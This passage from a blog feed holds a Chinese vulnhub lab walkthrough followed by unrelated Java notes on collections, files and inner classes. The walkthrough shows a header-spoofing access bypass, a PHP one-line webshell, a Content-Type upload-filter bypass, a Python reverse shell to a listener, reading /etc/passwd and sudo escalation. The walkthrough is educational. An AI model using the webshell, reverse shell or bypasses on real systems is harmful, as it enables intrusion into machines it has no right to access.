但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" alt="image-20220921112049063" style="zoom:67%;" /> <p>但令人遗憾的是，我们并不能查看该文件。</p><p><a id="jump3"></a></p><p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p></li><li><p>使用whatweb工具查看web应用所采用的软件构架：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" alt="image-20220921151941056"> </p><p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" alt="image-20220921091507301" style="zoom: 50%;" /> <p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure><p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p><p><a id="jump4"></a></p><p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p><p>上述结果中出现的状态码的含义分别为：</p><table><thead><tr><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>403</td><td>(禁止)服务器拒绝请求。</td></tr><tr><td>301</td><td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td></tr><tr><td>200</td><td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td></tr></tbody></table></li><li><p>访问<code>10.0.2.5/adminstration</code>：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" alt="image-20220921114137208"> </p><p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p><p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p><p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" alt="image-20220921124711969"> </p><p>发现成功进入一个登录界面：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" alt="image-20220921124805448"> </p><p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" alt="image-20220921130249392">  </p><p><a id="jump5"></a></p><p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p></li><li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p><p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试直接将其上传，发现网站提示文件被拒绝：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" alt="image-20220921130902640"> </p><p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" alt="image-20220921131442789"> </p><p>修改为：<code>image/png</code>：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" alt="image-20220921131518489"> </p><p>文件上传成功了，并提供了上传完成的文件的URL。</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" alt="image-20220921131734558"> </p><p><a id="jump6"></a></p><p><code>6:</code> 常见的过滤形式与绕过方法：</p><ol><li>针对文件扩展名的绕过：</li></ol><p>修改文件扩展名后，再上传。</p><p>2)针对文件类型的绕过：</p><p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p><p>3)针对文件内容的绕过：</p><p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p></li><li><p>通过URL访问文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure><p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" alt="image-20220921133834453"> </p><p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure><p>得到了靶机上的python路径，说明靶机有python环境：</p><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" alt="image-20220921134349689"> </p><p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure><p>修改对应的python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p><p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" alt="image-20220921140145500" style="zoom:67%;" /> <p>使用以下指令对反弹shell进行一个简单的升级: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" alt="image-20220921140419911"> </p></li><li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure><p>注意到有以下一项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure><p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p><p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p><p><a id="jump7"></a></p><p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure><p><a id="jump8"></a></p><p><code>8</code>: 对于用户的登录shell：</p><p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p><p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p><p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p></li><li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p><p>退出反弹shell，在kali的shell使用以下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" alt="image-20220921142200653" style="zoom:67%;" /> <p> 成功登入yousef后，查看该用户所在的用户组：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" alt="image-20220921142413525"> </p><p>发现该用户属于sudo组，查看该用户可执行的指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" alt="image-20220921142645249"> </p><p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure><p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p></li><li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p></li></ol><p>【完结撒花】</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;第一周&lt;/p&gt;
&lt;p&gt;可弟WZ&lt;/p&gt;
&lt;p&gt;主页：blog.kekwy.com&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#x6b;&amp;#x65;&amp;#x65;&amp;#107;&amp;#107;&amp;#101;&amp;#x77;&amp;#x79;&amp;#x40;&amp;#x</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>集合类与I/O操作</title>
    <link href="http://blog.kekwy.com/javaNotes-3/"/>
    <id>http://blog.kekwy.com/javaNotes-3/</id>
    <published>2022-08-05T00:15:26.000Z</published>
    <updated>2022-08-06T15:39:01.691Z</updated>
    
    <content type="html"><![CDATA[<p>数组的长度是固定的，集合的长度是可变的。</p><h2 id="I-Collection接口"><a href="#I-Collection接口" class="headerlink" title="I. Collection接口"></a>I. Collection接口</h2><ul><li><p><code>collection</code> 接口时层次结构中的根接口，构成其的单位称为元素。</p></li><li><p>常用方法：</p><table><thead><tr><th>方法</th><th>功能描述</th></tr></thead><tbody><tr><td>add(E e)</td><td>将指定的对象添加到该集合中</td></tr><tr><td>remove(Object o)</td><td>将指定的对象从该集合中移除</td></tr><tr><td>isEmpty()</td><td>返回boolean值，用于判断当前集合是否为空</td></tr><tr><td>iterator()</td><td>返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象</td></tr><tr><td>size()</td><td>返回int型值，获取该集合中元素的个数</td></tr></tbody></table></li><li><p>通过迭代器遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line">Collection&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">//将List实现类向上转型</span></span><br><span class="line">Iterator&lt;String&gt; it = list.iterator(); <span class="comment">//创建迭代器</span></span><br><span class="line"><span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) it.next();</span><br><span class="line">&#125; <span class="comment">//遍历</span></span><br></pre></td></tr></table></figure><p>tips：<code>Iterator</code> 的 <code>next()</code> 方法返回的是 <code>Object</code> 。</p></li></ul><h2 id="II-List集合"><a href="#II-List集合" class="headerlink" title="II. List集合"></a>II. List集合</h2><ul><li><p>List集合包括List接口以及List接口的所有实现类；</p></li><li><p>允许元素重复，元素顺序就是对象的插入顺序；</p></li><li><p>包含Collection中的所有方法，此外还有如下两个重要方法：</p><p><code>get(int index)</code>：获得指定索引位置的元素；</p><p><code>set(int index, Object obj)</code>：将集合中指定索引位置的对象修改为指定的对象；</p></li><li><p>实现类：<code>ArrayList</code>（数组实现）、<code>LinkedList</code>（链表实现）。</p></li></ul><h2 id="III-Set集合"><a href="#III-Set集合" class="headerlink" title="III. Set集合"></a>III. Set集合</h2><ul><li><p>不按特定方式排序，不能包含重复元素，需要<strong>小心操作其中的可变对象</strong>；</p></li><li><p>实现类;</p><ul><li><code>HashSet</code>：不保证迭代顺序永恒不变；</li><li><code>TreeSet</code>：额外实现了 <code>java.util.SortedSet</code> 接口，可以对集合中元素进行排序。</li></ul></li><li><p><code>TreeSet</code> 类增加的方法：</p><table><thead><tr><th>方法</th><th>功能描述</th></tr></thead><tbody><tr><td>first()</td><td>返回此Set中当前第一个（最低）元素</td></tr><tr><td>last()</td><td>返回此Set中当前最后一个（最高）元素</td></tr><tr><td>comparator()</td><td>返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null</td></tr><tr><td>headSet(E toElement)</td><td>返回一个新的Set集合，新集合是 <code>toElement</code>（不包含）之前的所有对象</td></tr><tr><td>subSet(E fromElement, E toElement)</td><td>返回一个新的Set集合，是<code>fromElement</code>（包含）对象与<code>toElement</code>（不包含）对象之间的所有对象</td></tr><tr><td>tailSet(E fromElement)</td><td>返回一个新的Set集合，新集合包含对象 <code>fromElement</code>（包含）之后的所有对象</td></tr></tbody></table></li></ul><h2 id="IV-Map集合"><a href="#IV-Map集合" class="headerlink" title="IV. Map集合"></a>IV. Map集合</h2><ul><li><p>一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。</p></li><li><p>常用方法：</p><table><thead><tr><th>方法</th><th>功能描述</th></tr></thead><tbody><tr><td>put(K key, V value)</td><td>向集合中添加指定的可以呢与value的映射关系</td></tr><tr><td>containsKey(Object key)</td><td>如果此映射包含指定key的映射关系，则返回true</td></tr><tr><td>containsValue(Object value)</td><td>如果此映射将一个或多个key映射到指定值，则返回true</td></tr><tr><td>get(Object key)</td><td>如果存在指定的key对象，则返回该对象对应的值，否则返回null</td></tr><tr><td>keySet()</td><td>返回该集合中的所有key对象形成的Set集合</td></tr><tr><td>values()</td><td>返回该集合中所有值对象形成的Collection集合</td></tr></tbody></table></li><li><p>实现类：</p><p>HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用）</p><p>TreeMap：可排序，不允许null键。</p></li></ul><hr><h2 id="V-File类"><a href="#V-File类" class="headerlink" title="V. File类"></a>V. File类</h2><h3 id="File构造方法"><a href="#File构造方法" class="headerlink" title="File构造方法"></a>File构造方法</h3><ul><li><p>通过完整路径名（包含文件名）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File(String pathname);</span><br></pre></td></tr></table></figure></li><li><p>通过父路径与子路径（包含文件名）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File(String parent, String child);</span><br></pre></td></tr></table></figure></li><li><p>通过父路径对象与子路径（包含文件名）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File(File f, String pathname);</span><br></pre></td></tr></table></figure></li></ul><h3 id="文件创建与删除"><a href="#文件创建与删除" class="headerlink" title="文件创建与删除"></a>文件创建与删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;word.txt&quot;</span>);</span><br><span class="line">file.delete();<span class="comment">//删除文件</span></span><br><span class="line">file.creatNewFile();<span class="comment">//创建文件</span></span><br></pre></td></tr></table></figure><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><table><thead><tr><th>方法</th><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td>getName()</td><td>String</td><td>获取文件名称</td></tr><tr><td>canRead()</td><td>boolean</td><td>判断文件是否为可读的</td></tr><tr><td>canWrite()</td><td>boolean</td><td>判断文件是否可被写入</td></tr><tr><td>exits()</td><td>boolean</td><td>判断文件是否存在</td></tr><tr><td>length()</td><td>long</td><td>获取文件的长度（以字节为单位）</td></tr><tr><td>getAbsolutePath()</td><td>String</td><td>获取文件的绝对路径</td></tr><tr><td>getParent()</td><td>String</td><td>获取文件的父路径</td></tr><tr><td>isFile()</td><td>boolean</td><td>判断文件是否存在</td></tr><tr><td>isDirectory</td><td>boolean</td><td>判断文件是否为一个目录</td></tr><tr><td>isHidden()</td><td>boolean</td><td>判断文件是否为隐藏文件</td></tr><tr><td>lastModified()</td><td>long</td><td>获取文件最后修改时间</td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;数组的长度是固定的，集合的长度是可变的。&lt;/p&gt;
&lt;h2 id=&quot;I-Collection接口&quot;&gt;&lt;a href=&quot;#I-Collection接口&quot; class=&quot;headerlink&quot; title=&quot;I. Collection接口&quot;&gt;&lt;/a&gt;I. Collection接口</summary>
      
    
    
    
    <category term="从继承开始的Java应用笔记" scheme="http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="http://blog.kekwy.com/tags/Java/"/>
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="编程" scheme="http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>类的高级特性与异常处理</title>
    <link href="http://blog.kekwy.com/javaNotes-2/"/>
    <id>http://blog.kekwy.com/javaNotes-2/</id>
    <published>2022-08-01T11:50:13.000Z</published>
    <updated>2022-08-04T04:25:52.401Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-Java类包"><a href="#I-Java类包" class="headerlink" title="I. Java类包"></a>I. Java类包</h2><ol><li><p>类名冲突：</p><p>任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。</p></li><li><p>类的路径：</p><ul><li>同一个类包中的类相互访问时，可以不指定包名；</li><li>同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。</li></ul></li><li><p>指定包与导入包：</p><p>将 <code>package</code> 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名;</span><br></pre></td></tr></table></figure><p>导入包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.*</span><br><span class="line"><span class="keyword">import</span> 包名.类名</span><br><span class="line"><span class="keyword">import</span> 包名.静态方法名</span><br></pre></td></tr></table></figure><p>tips: </p><p>使用 <code>import</code> 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。</p></li></ol><h2 id="II-final-关键字"><a href="#II-final-关键字" class="headerlink" title="II. final 关键字"></a>II. final 关键字</h2><ol><li>变量：<ul><li>修饰常量变量；</li><li>对象引用被 <code>final</code> 修饰后无法使其指向另一个对象；</li><li>Java中定义全局变量，通常使用 <code>public static final</code> 修饰，是能在定义时被赋值。</li></ul></li><li>方法：<ul><li>被 <code>final</code> 修饰的方法不能被重写；</li><li><code>private</code> 方法隐式被指定为 <code>final</code> 类型。</li></ul></li><li>类：<ul><li>被修饰的类不能被继承。</li></ul></li></ol><h2 id="III-内部类"><a href="#III-内部类" class="headerlink" title="III. 内部类"></a>III. 内部类</h2><h3 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h3><ol><li><p>基础用法：</p><ul><li><p>成员内部类的定义：（非内部类不能被声明为private或protected访问类型）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;<span class="comment">// 外部类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;<span class="comment">// 内部类</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）；</p></li><li><p>内部类中的变量与外部类变量同名时，可以使用 <code>this</code> 指针加以区分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 若内部类与外部类中均有变量x</span></span><br><span class="line"><span class="built_in">this</span>.x; <span class="comment">// 内部类的x</span></span><br><span class="line">OuterClass.<span class="built_in">this</span>.x; <span class="comment">// 外部类的x</span></span><br><span class="line">x; <span class="comment">// 同名局部变量、形参（若有）</span></span><br></pre></td></tr></table></figure></li><li><p>在外部类和非静态方法之外实例化内部类对象，需要使用外部类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> = <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">OuterClass.<span class="type">innerClass</span> <span class="variable">in</span> <span class="operator">=</span> out.<span class="keyword">new</span> <span class="title class_">innerClass</span>();</span><br></pre></td></tr></table></figure><p>内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。</p></li></ul></li><li><p>内部类向上转型为接口;</p><ul><li>将一个权限修饰符为 <code>private</code> 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程；</li><li>对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个外部不可访问的内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> <span class="keyword">implements</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">        <span class="comment">// 实现接口方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// do something...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> OutInterface doit &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InnerClass</span>(); <span class="comment">// 将内部类向上转型为外部接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line"><span class="type">OutInterface</span> <span class="variable">outinter</span> <span class="operator">=</span> out.doit();</span><br><span class="line">outinter.f();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>外部不可直接访问内部类中的 f() 